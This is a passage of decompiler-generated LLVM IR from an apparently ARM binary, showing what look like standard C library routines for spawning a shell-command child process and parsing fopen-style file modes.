  br label %dec_label_pc_d578

dec_label_pc_d558:                                ; preds = %dec_label_pc_d548
  %v0_d558 = call i32 @function_d0ec()
  store i32 %v0_d558, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_d568 = inttoptr i32 %v0_d558 to i32*
  store i32 22, i32* %v2_d568, align 4
  br label %dec_label_pc_d7ac

dec_label_pc_d570:                                ; preds = %dec_label_pc_d520
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d578

dec_label_pc_d578:                                ; preds = %bb, %dec_label_pc_d570
  %v0_d66c = phi i32 [ 0, %dec_label_pc_d570 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_d57c = call i32 @function_10110(i32 12)
  store i32 %v1_d57c, i32* %r0.global-to-local, align 4
  store i32 %v1_d57c, i32* %r3.global-to-local, align 4
  %v2_d580 = icmp eq i32 %v1_d57c, 0
  br i1 %v2_d580, label %dec_label_pc_d7ac, label %dec_label_pc_d58c

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d578
  %v2_d58c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_d58c, i32* %r0.global-to-local, align 4
  %v1_d594 = call i32 @function_12bbc(i32 %v2_d58c)
  store i32 %v1_d594, i32* %r0.global-to-local, align 4
  %v2_d598 = icmp eq i32 %v1_d594, 0
  br i1 %v2_d598, label %dec_label_pc_d5a0, label %dec_label_pc_d79c

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d58c
  store i32 %v0_d66c, i32* %r0.global-to-local, align 4
  %v2_d5a4 = ptrtoint i32* %stack_var_-24 to i32
  %v1_d5a8 = xor i32 %v0_d66c, 1
  store i32 -8, i32* %r2.global-to-local, align 4
  %tmp26 = sub nsw i32 0, %v1_d5a8
  %v4_d5b0 = and i32 %tmp26, 4
  %v5_d5b0 = add i32 %v4_d5b0, %v2_d5a4
  store i32 %v5_d5b0, i32* %r3.global-to-local, align 4
  %v2_d5b4 = add i32 %v5_d5b0, -8
  %v3_d5b4 = inttoptr i32 %v2_d5b4 to i32*
  %v4_d5b4 = load i32, i32* %v3_d5b4, align 4
  store i32 %v2_d5a4, i32* @ip, align 4
  %tmp27 = sub nsw i32 0, %v0_d66c
  %v4_d5c0 = and i32 %tmp27, 4
  %v5_d5c0 = add i32 %v4_d5c0, %v2_d5a4
  store i32 %v5_d5c0, i32* %r3.global-to-local, align 4
  %v2_d5c4 = add i32 %v5_d5c0, -8
  %v3_d5c4 = inttoptr i32 %v2_d5c4 to i32*
  %v4_d5c4 = load i32, i32* %v3_d5c4, align 4
  store i32 %v4_d5c4, i32* @r3, align 4
  %v0_d5c8 = load i32, i32* @r4, align 4
  store i32 %v4_d5b4, i32* %r0.global-to-local, align 4
  %v7_d5d4 = call i32 @function_13804(i32 %v4_d5b4, i32 %v0_d5c8, i32 -8, i32 %v4_d5c4, i32 %v4_d5b4, i32 %v4_d5c4)
  store i32 %v7_d5d4, i32* %r0.global-to-local, align 4
  %v2_d5d8 = icmp eq i32 %v7_d5d4, 0
  br i1 %v2_d5d8, label %dec_label_pc_d5e4, label %dec_label_pc_d5f8

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5a0
  store i32 %v4_d5b4, i32* %r0.global-to-local, align 4
  %v1_d5e8 = call i32 @function_d088(i32 %v4_d5b4)
  store i32 %v4_d5c4, i32* %r0.global-to-local, align 4
  %v1_d5f0 = call i32 @function_d088(i32 %v4_d5c4)
  store i32 %v1_d5f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d79c

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5a0
  store i32 142964, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 2012, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23650.276 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23650.276 to i32), i32* %r2.global-to-local, align 4
  %v2_d618 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_d618, i32* %r0.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_d624 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 %v4_d624, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d624)
  %v0_d630 = load i32, i32* @r4, align 4
  store i32 %v0_d630, i32* @r0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v4_d63c = load i32, i32* inttoptr (i32 142980 to i32*), align 4
  store i32 %v4_d63c, i32* %ip.global-to-local, align 4
  store i32 54856, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d63c)
  %v0_d648 = call i32 @function_12a80()
  store i32 %v0_d648, i32* %r0.global-to-local, align 4
  store i32 %v0_d648, i32* @r5, align 4
  %v2_d64c = icmp eq i32 %v0_d648, 0
  br i1 %v2_d64c, label %dec_label_pc_d654, label %dec_label_pc_d6e0

dec_label_pc_d654:                                ; preds = %dec_label_pc_d5f8
  store i32 %v4_d5b4, i32* %r0.global-to-local, align 4
  %v1_d658 = call i32 @function_d088(i32 %v4_d5b4)
  store i32 %v1_d658, i32* %r0.global-to-local, align 4
  store i32 %v4_d5c4, i32* %r2.global-to-local, align 4
  store i32 %v0_d66c, i32* %r3.global-to-local, align 4
  %v9_d664 = icmp eq i32 %v4_d5c4, %v0_d66c
  br i1 %v9_d664, label %dec_label_pc_d680, label %dec_label_pc_d66c

dec_label_pc_d66c:                                ; preds = %dec_label_pc_d654
  store i32 %v4_d5c4, i32* %r0.global-to-local, align 4
  %v2_d674 = call i32 @function_12af4(i32 %v4_d5c4, i32 %v0_d66c)
  store i32 %v4_d5c4, i32* %r0.global-to-local, align 4
  %v1_d67c = call i32 @function_d088(i32 %v4_d5c4)
  store i32 %v1_d67c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d680

dec_label_pc_d680:                                ; preds = %dec_label_pc_d654, %dec_label_pc_d66c
  store i32 2036, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_23668.280, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d6a05 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d6a05, label %dec_label_pc_d6a8, label %dec_label_pc_d690

dec_label_pc_d690:                                ; preds = %dec_label_pc_d680, %dec_label_pc_d690
  %v0_d690 = phi i32 [ %storemerge, %dec_label_pc_d690 ], [ %storemerge3, %dec_label_pc_d680 ]
  %v1_d690 = add i32 %v0_d690, 4
  %v2_d690 = inttoptr i32 %v1_d690 to i32*
  %v3_d690 = load i32, i32* %v2_d690, align 4
  store i32 %v3_d690, i32* %r3.global-to-local, align 4
  %v1_d694 = add i32 %v3_d690, 4
  %v2_d694 = inttoptr i32 %v1_d694 to i32*
  %v3_d694 = load i32, i32* %v2_d694, align 4
  store i32 %v3_d694, i32* %r0.global-to-local, align 4
  %v1_d698 = call i32 @function_d088(i32 %v3_d694)
  store i32 %v1_d698, i32* %r0.global-to-local, align 4
  %v0_d69c = load i32, i32* @r4, align 4
  %v1_d69c = inttoptr i32 %v0_d69c to i32*
  %storemerge = load i32, i32* %v1_d69c, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d6a0 = icmp eq i32 %storemerge, 0
  br i1 %v2_d6a0, label %dec_label_pc_d6a8, label %dec_label_pc_d690

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d690, %dec_label_pc_d680
  store i32 ptrtoint ([3 x i8]* @global_var_19a94.289 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19a88.291 to i32), i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v8_d6d4 = call i32 @function_12478(i32 ptrtoint ([8 x i8]* @global_var_19a88.291 to i32), i32 ptrtoint ([3 x i8]* @global_var_19a90.293 to i32), i32 ptrtoint ([3 x i8]* @global_var_19a94.289 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d6dc = call i32 @function_12ec0(i32 127)
  store i32 %v1_d6dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d6e0

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d5f8, %dec_label_pc_d6a8
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  store i32 %v2_d618, i32* @r6, align 4
  %v4_d6ec = load i32, i32* inttoptr (i32 142988 to i32*), align 4
  store i32 %v4_d6ec, i32* @r7, align 4
  store i32 %v2_d618, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_d700.295 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_d6ec)
  store i32 %v4_d5c4, i32* %r0.global-to-local, align 4
  %v1_d704 = call i32 @function_d088(i32 %v4_d5c4)
  store i32 %v1_d704, i32* %r0.global-to-local, align 4
  %v0_d708 = load i32, i32* @r5, align 4
  %tmp29 = icmp slt i32 %v0_d708, 1
  br i1 %tmp29, label %dec_label_pc_d794, label %dec_label_pc_d710

dec_label_pc_d710:                                ; preds = %dec_label_pc_d6e0
  store i32 %v7_d5d4, i32* %r3.global-to-local, align 4
  store i32 %v1_d57c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23650.276 to i32), i32* %r4.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v2_d72c = add i32 %v1_d57c, 8
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v0_d708, i32* %v3_d72c, align 4
  %v0_d730 = load i32, i32* %r3.global-to-local, align 4
  %v1_d730 = load i32, i32* %r2.global-to-local, align 4
  %v2_d730 = add i32 %v1_d730, 4
  %v3_d730 = inttoptr i32 %v2_d730 to i32*
  store i32 %v0_d730, i32* %v3_d730, align 4
  %v0_d738 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d738, i32* %r2.global-to-local, align 4
  store i32 %v2_d618, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_d744 = load i32, i32* %ip.global-to-local, align 4
  %v2_d744 = add i32 %v0_d744, 76
  %v3_d744 = inttoptr i32 %v2_d744 to i32*
  %v4_d744 = load i32, i32* %v3_d744, align 4
  store i32 %v4_d744, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d744)
  %v0_d754 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d754, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v4_d75c = load i32, i32* inttoptr (i32 142980 to i32*), align 4
  store i32 %v4_d75c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d75c)
  store i32 2036, i32* %r2.global-to-local, align 4
  store i32 142964, i32* @ip, align 4
  store i32 %v1_d57c, i32* %r0.global-to-local, align 4
  %v4_d774 = load i32, i32* @global_var_23668.280, align 4
  store i32 %v4_d774, i32* %r3.global-to-local, align 4
  %v2_d77c = inttoptr i32 %v1_d57c to i32*
  store i32 %v4_d774, i32* %v2_d77c, align 4
  %v0_d780 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d780, i32* @global_var_23668.280, align 4
  store i32 %v2_d618, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d6ec)
  br label %dec_label_pc_d7ac

dec_label_pc_d794:                                ; preds = %dec_label_pc_d6e0
  store i32 %v7_d5d4, i32* %r0.global-to-local, align 4
  %v1_d798 = inttoptr i32 %v7_d5d4 to i16*
  %v2_d798 = call i32 @function_d108(i16* %v1_d798)
  store i32 %v2_d798, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d79c

dec_label_pc_d79c:                                ; preds = %dec_label_pc_d58c, %dec_label_pc_d5e4, %dec_label_pc_d794
  store i32 %v1_d57c, i32* @r0, align 4
  %v0_d7a0 = call i32 @function_11048()
  store i32 %v0_d7a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d710, %dec_label_pc_d558, %dec_label_pc_d79c
  %stack_var_-68.1 = phi i32 [ 0, %dec_label_pc_d578 ], [ 0, %dec_label_pc_d79c ], [ %v7_d5d4, %dec_label_pc_d710 ], [ 0, %dec_label_pc_d558 ]
  store i32 %stack_var_-68.1, i32* %r0.global-to-local, align 4
  %v2_d7b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d7b4, i32* @r4, align 4
  store i32 %v6_d520, i32* @r5, align 4
  store i32 %v9_d520, i32* @r6, align 4
  store i32 %v12_d520, i32* @r7, align 4
  store i32 %v15_d520, i32* @lr, align 4
  ret i32 %stack_var_-68.1

; uselistorder directives
  uselistorder i32 %stack_var_-68.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d5d4, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d5c4, { 3, 2, 1, 0, 7, 6, 9, 8, 5, 4, 11, 10, 12 }
  uselistorder i32 %v4_d5b4, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_d5a4, { 0, 2, 1 }
  uselistorder i32 %v1_d57c, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %v0_d66c, { 1, 4, 3, 0, 2, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 9, 3, 4, 5, 6, 7, 8, 12, 10, 11, 13, 15, 14, 17, 16, 19, 18, 20, 22, 21, 35, 23, 24, 26, 25, 27, 34, 28, 29, 36, 30, 32, 31, 33, 0 }
  uselistorder i32* @global_var_23668.280, { 1, 2, 0, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_23650.276 to i32), { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7ac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d79c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d6e0, { 1, 0 }
  uselistorder label %dec_label_pc_d690, { 1, 0 }
  uselistorder label %dec_label_pc_d680, { 1, 0 }
  uselistorder label %dec_label_pc_d578, { 1, 0 }
}

define i32 @function_d7c0(i64* %arg1) local_unnamed_addr {
dec_label_pc_d7c0:
  %v0_d7c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7c0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d7c0
  call void @llvm.trap()
  unreachable

.thread3:                                         ; preds = %dec_label_pc_d7c0
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_d7e4() local_unnamed_addr {
dec_label_pc_d7e4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d7e4 = load i32, i32* @r4, align 4
  store i32 %v3_d7e4, i32* %stack_var_-36, align 4
  %v6_d7e4 = load i32, i32* @r5, align 4
  %v9_d7e4 = load i32, i32* @r6, align 4
  %v18_d7e4 = load i32, i32* @sb, align 4
  %v24_d7e4 = load i32, i32* @fp, align 4
  %v0_d7e8 = load i32, i32* @r1, align 4
  %v1_d7e8 = inttoptr i32 %v0_d7e8 to i8*
  %v2_d7e8 = load i8, i8* %v1_d7e8, align 1
  %v3_d7e8 = zext i8 %v2_d7e8 to i32
  store i32 %v3_d7e8, i32* @ip, align 4
  %v7_d7f0 = icmp eq i8 %v2_d7e8, 114
  store i32 142964, i32* @fp, align 4
  %v2_d7f8 = ptrtoint i32* %stack_var_-72 to i32
  %v0_d7fc = load i32, i32* @r0, align 4
  store i32 %v0_d7fc, i32* @r6, align 4
  %v0_d800 = load i32, i32* @r2, align 4
  store i32 %v0_d800, i32* @sb, align 4
  %v0_d804 = load i32, i32* @r3, align 4
  store i32 %v0_d804, i32* @r5, align 4
  br i1 %v7_d7f0, label %dec_label_pc_d850, label %dec_label_pc_d80c

dec_label_pc_d80c:                                ; preds = %dec_label_pc_d7e4
  %v7_d80c = icmp eq i8 %v2_d7e8, 119
  br i1 %v7_d80c, label %bb, label %dec_label_pc_d818

bb:                                               ; preds = %dec_label_pc_d80c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d854

dec_label_pc_d818:                                ; preds = %dec_label_pc_d80c
  %v7_d818 = icmp eq i8 %v2_d7e8, 97
  br i1 %v7_d818, label %bb32, label %dec_label_pc_d824

bb32:                                             ; preds = %dec_label_pc_d818
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d854

dec_label_pc_d824:                                ; preds = %dec_label_pc_d818, %dec_label_pc_d8d8, %dec_label_pc_d8ac
  %v0_d824 = call i32 @function_d0ec()
  store i32 %v0_d824, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d82c = load i32, i32* @sb, align 4
  %v2_d82c = icmp eq i32 %v0_d82c, 0
  %v2_d830 = inttoptr i32 %v0_d824 to i32*
  store i32 22, i32* %v2_d830, align 4
  br i1 %v2_d82c, label %dec_label_pc_daa4, label %dec_label_pc_d838

dec_label_pc_d838:                                ; preds = %dec_label_pc_d824, %dec_label_pc_d8fc._crit_edge
  %v0_d838 = load i32, i32* @sb, align 4
  %v1_d838 = inttoptr i32 %v0_d838 to i16*
  %v2_d838 = load i16, i16* %v1_d838, align 2
  %v3_d838 = zext i16 %v2_d838 to i32
  store i32 %v3_d838, i32* %r3.global-to-local, align 4
  %v1_d83c = and i32 %v3_d838, 8192
  %v2_d83c = icmp eq i32 %v1_d83c, 0
  br i1 %v2_d83c, label %dec_label_pc_daa4, label %dec_label_pc_d844

dec_label_pc_d844:                                ; preds = %dec_label_pc_d838
  store i32 %v0_d838, i32* @r0, align 4
  %v0_d848 = call i32 @function_11048()
  store i32 %v0_d848, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_daa4

dec_label_pc_d850:                                ; preds = %dec_label_pc_d7e4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %bb, %bb32, %dec_label_pc_d850
  %v1_d86c = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_d850 ]
  %v1_d854 = add i32 %v0_d7e8, 1
  %v2_d854 = inttoptr i32 %v1_d854 to i8*
  %v3_d854 = load i8, i8* %v2_d854, align 1
  %v7_d858 = icmp eq i8 %v3_d854, 98
  %v1_d854.v0_d7e8 = select i1 %v7_d858, i32 %v1_d854, i32 %v0_d7e8
  store i32 %v1_d854.v0_d7e8, i32* %r3.global-to-local, align 4
  %v1_d864 = add i32 %v1_d854.v0_d7e8, 1
  %v2_d864 = inttoptr i32 %v1_d864 to i8*
  %v3_d864 = load i8, i8* %v2_d864, align 1
  %v4_d864 = zext i8 %v3_d864 to i32
  store i32 %v4_d864, i32* @r3, align 4
  %v7_d868 = icmp eq i8 %v3_d864, 43
  br i1 %v7_d868, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_d854
  store i32 %v1_d86c, i32* @r3, align 4
  %v2_d870 = add nuw nsw i32 %v1_d86c, 1
  store i32 %v2_d870, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d854, %bb35
  %v2_d874 = icmp eq i32 %v0_d800, 0
  br i1 %v2_d874, label %dec_label_pc_d87c, label %dec_label_pc_d8a4

dec_label_pc_d87c:                                ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d880 = call i32 @function_10110(i32 80)
  store i32 %v1_d880, i32* %r0.global-to-local, align 4
  store i32 %v1_d880, i32* @sb, align 4
  %v3_d884 = icmp eq i32 %v1_d880, 0
  br i1 %v3_d884, label %dec_label_pc_daa8, label %dec_label_pc_d88c

dec_label_pc_d88c:                                ; preds = %dec_label_pc_d87c
  %v2_d890 = add i32 %v1_d880, 8
  %v3_d890 = inttoptr i32 %v2_d890 to i32*
  store i32 0, i32* %v3_d890, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_d898 = load i32, i32* @sb, align 4
  %v3_d898 = inttoptr i32 %v2_d898 to i16*
  store i16 8192, i16* %v3_d898, align 2
  %v0_d89c = load i32, i32* @sb, align 4
  %v1_d89c = add i32 %v0_d89c, 56
  store i32 %v1_d89c, i32* @r0, align 4
  %v1_d8a0 = call i32 @function_db54(i32 %v1_d89c)
  store i32 %v1_d8a0, i32* %r0.global-to-local, align 4
  %v0_d8a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d8a4

dec_label_pc_d8a4:                                ; preds = %.thread3, %dec_label_pc_d88c
  %v0_d8fc = phi i32 [ %v0_d804, %.thread3 ], [ %v0_d8a4.pre, %dec_label_pc_d88c ]
  %v1_d8a4 = icmp slt i32 %v0_d8fc, 0
  br i1 %v1_d8a4, label %dec_label_pc_d8fc, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %dec_label_pc_d8a4
  %v0_d8b0 = load i32, i32* @r4, align 4
  %v2_d8b0 = and i32 %v0_d8b0, 131075
  %v1_d8b4 = add nuw nsw i32 %v2_d8b0, 1
  store i32 %v1_d8b4, i32* %r2.global-to-local, align 4
  %v0_d8b8 = load i32, i32* @r6, align 4
  %v1_d8b8 = add i32 %v0_d8b8, 1
  %v2_d8bc = and i32 %v1_d8b8, %v1_d8b4
  store i32 %v2_d8bc, i32* %r3.global-to-local, align 4
  %v9_d8c0 = icmp eq i32 %v2_d8bc, %v1_d8b4
  %v1_d8c4 = load i32, i32* @sb, align 4
  %v2_d8c4 = add i32 %v1_d8c4, 4
  %v3_d8c4 = inttoptr i32 %v2_d8c4 to i32*
  store i32 %v0_d8fc, i32* %v3_d8c4, align 4
  br i1 %v9_d8c0, label %dec_label_pc_d8cc, label %dec_label_pc_d824

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d8ac
  %v0_d8cc = load i32, i32* @r4, align 4
  %v1_d8cc = load i32, i32* @r6, align 4
  %v2_d8cc = sub i32 -1, %v1_d8cc
  %v3_d8cc = and i32 %v0_d8cc, %v2_d8cc
  store i32 %v3_d8cc, i32* @r3, align 4
  %v1_d8d0 = and i32 %v3_d8cc, 1024
  %v2_d8d0 = icmp eq i32 %v1_d8d0, 0
  br i1 %v2_d8d0, label %dec_label_pc_d8f0, label %dec_label_pc_d8d8

dec_label_pc_d8d8:                                ; preds = %dec_label_pc_d8cc
  %v0_d8d8 = load i32, i32* @r5, align 4
  store i32 %v0_d8d8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_d8e4 = call i32 @function_12d0c(i32 %v0_d8d8, i32 4)
  store i32 %v2_d8e4, i32* %r0.global-to-local, align 4
  %v2_d8e8 = icmp eq i32 %v2_d8e4, 0
  br i1 %v2_d8e8, label %dec_label_pc_d8d8.dec_label_pc_d8f0_crit_edge, label %dec_label_pc_d824

dec_label_pc_d8d8.dec_label_pc_d8f0_crit_edge:    ; preds = %dec_label_pc_d8d8
  %v0_d8f0.pre = load i32, i32* @r6, align 4
  %v0_d8f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d8f0

dec_label_pc_d8f0:                                ; preds = %dec_label_pc_d8d8.dec_label_pc_d8f0_crit_edge, %dec_label_pc_d8cc
  %v0_d8f4 = phi i32 [ %v0_d8f4.pre, %dec_label_pc_d8d8.dec_label_pc_d8f0_crit_edge ], [ %v0_d8cc, %dec_label_pc_d8cc ]
  %v0_d8f0 = phi i32 [ %v0_d8f0.pre, %dec_label_pc_d8d8.dec_label_pc_d8f0_crit_edge ], [ %v1_d8cc, %dec_label_pc_d8cc ]
  %v1_d8f0 = and i32 %v0_d8f0, 131072
  store i32 %v1_d8f0, i32* %r3.global-to-local, align 4
  %v2_d8f4 = or i32 %v1_d8f0, %v0_d8f4
  store i32 %v2_d8f4, i32* @r4, align 4
  br label %dec_label_pc_d920

dec_label_pc_d8fc:                                ; preds = %dec_label_pc_d8a4
  %v7_d8fc = icmp eq i32 %v0_d8fc, -1
  %v0_d908.pre = load i32, i32* @r4, align 4
  br i1 %v7_d8fc, label %dec_label_pc_d8fc._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_d8fc
  %v2_d900 = or i32 %v0_d908.pre, 131072
  store i32 %v2_d900, i32* @r4, align 4
  br label %dec_label_pc_d8fc._crit_edge

dec_label_pc_d8fc._crit_edge:                     ; preds = %dec_label_pc_d8fc, %bb36
  %v0_d908 = phi i32 [ %v2_d900, %bb36 ], [ %v0_d908.pre, %dec_label_pc_d8fc ]
  %v0_d904 = load i32, i32* @r6, align 4
  store i32 %v0_d904, i32* %r0.global-to-local, align 4
  store i32 %v0_d908, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d910 = call i32 @function_12b5c(i32 %v0_d904, i32 %v0_d908)
  store i32 %v2_d910, i32* %r0.global-to-local, align 4
  %v1_d914 = icmp slt i32 %v2_d910, 0
  %v1_d918 = load i32, i32* @sb, align 4
  %v2_d918 = add i32 %v1_d918, 4
  %v3_d918 = inttoptr i32 %v2_d918 to i32*
  store i32 %v2_d910, i32* %v3_d918, align 4
  br i1 %v1_d914, label %dec_label_pc_d838, label %.dec_label_pc_d920_crit_edge

.dec_label_pc_d920_crit_edge:                     ; preds = %dec_label_pc_d8fc._crit_edge
  %v0_d924.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %.dec_label_pc_d920_crit_edge, %dec_label_pc_d8f0
  %v0_d93c = phi i32 [ %v0_d924.pre, %.dec_label_pc_d920_crit_edge ], [ %v2_d8f4, %dec_label_pc_d8f0 ]
  %v0_d920 = load i32, i32* @sb, align 4
  %v1_d920 = inttoptr i32 %v0_d920 to i16*
  %v2_d920 = load i16, i16* %v1_d920, align 2
  %v3_d920 = zext i16 %v2_d920 to i32
  %v1_d924 = urem i32 %v0_d93c, 4
  %v1_d928 = and i32 %v0_d93c, 1024
  %v1_d92c = and i32 %v3_d920, 8192
  %v1_d930 = add nuw nsw i32 %v1_d924, 1
  %v2_d934 = or i32 %v1_d92c, %v1_d928
  store i32 %v2_d934, i32* %r3.global-to-local, align 4
  %v1_d938 = xor i32 %v1_d930, 3
  store i32 %v1_d938, i32* %r1.global-to-local, align 4
  %v1_d93c = and i32 %v0_d93c, 131072
  store i32 %v1_d93c, i32* %r2.global-to-local, align 4
  %v2_d93c = icmp eq i32 %v1_d93c, 0
  %v1_d940 = add i32 %v0_d920, 4
  %v2_d940 = inttoptr i32 %v1_d940 to i32*
  %v3_d940 = load i32, i32* %v2_d940, align 4
  store i32 %v3_d940, i32* @r5, align 4
  br i1 %v2_d93c, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_d920
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_d920, %bb37
  %v0_d94c = phi i32 [ 0, %dec_label_pc_d920 ], [ 32768, %bb37 ]
  %v4_d948 = mul nuw nsw i32 %v1_d938, 16
  %v5_d948 = or i32 %v2_d934, %v4_d948
  store i32 %v5_d948, i32* %r3.global-to-local, align 4
  %v2_d94c = or i32 %v0_d94c, %v5_d948
  store i32 %v2_d94c, i32* %r2.global-to-local, align 4
  %v8_d950 = icmp eq i32 %v3_d940, 2147483647
  %v1_d954 = trunc i32 %v2_d94c to i16
  store i16 %v1_d954, i16* %v1_d920, align 2
  br i1 %v8_d950, label %dec_label_pc_d984, label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb38
  %v0_d95c = call i32 @function_d0ec()
  store i32 %v0_d95c, i32* @r4, align 4
  %v0_d964 = load i32, i32* @r5, align 4
  store i32 %v0_d964, i32* @r0, align 4
  %v1_d968 = inttoptr i32 %v0_d95c to i32*
  %v2_d968 = load i32, i32* %v1_d968, align 4
  store i32 %v2_d968, i32* @r5, align 4
  %v1_d96c = call i32 @function_fbb4(i32 %v0_d964)
  store i32 %v1_d96c, i32* %r0.global-to-local, align 4
  %v2_d970 = icmp eq i32 %v1_d96c, 0
  br i1 %v2_d970, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_d95c
  %v1_d974 = load i32, i32* @sb, align 4
  %v2_d974 = inttoptr i32 %v1_d974 to i16*
  %v3_d974 = load i16, i16* %v2_d974, align 2
  %v4_d974 = zext i16 %v3_d974 to i32
  %v2_d978 = or i32 %v4_d974, 256
  store i32 %v2_d978, i32* %r3.global-to-local, align 4
  %v2_d97c = trunc i32 %v2_d978 to i16
  store i16 %v2_d97c, i16* %v2_d974, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_d95c, %bb39
  %v0_d980 = load i32, i32* @r5, align 4
  %v1_d980 = load i32, i32* @r4, align 4
  %v2_d980 = inttoptr i32 %v1_d980 to i32*
  store i32 %v0_d980, i32* %v2_d980, align 4
  br label %dec_label_pc_d984

dec_label_pc_d984:                                ; preds = %bb38, %.thread5
  %v0_d984 = load i32, i32* @sb, align 4
  %v1_d984 = add i32 %v0_d984, 8
  %v2_d984 = inttoptr i32 %v1_d984 to i32*
  %v3_d984 = load i32, i32* %v2_d984, align 4
  store i32 %v3_d984, i32* %r3.global-to-local, align 4
  %v2_d988 = icmp eq i32 %v3_d984, 0
  br i1 %v2_d988, label %dec_label_pc_d990, label %bb40

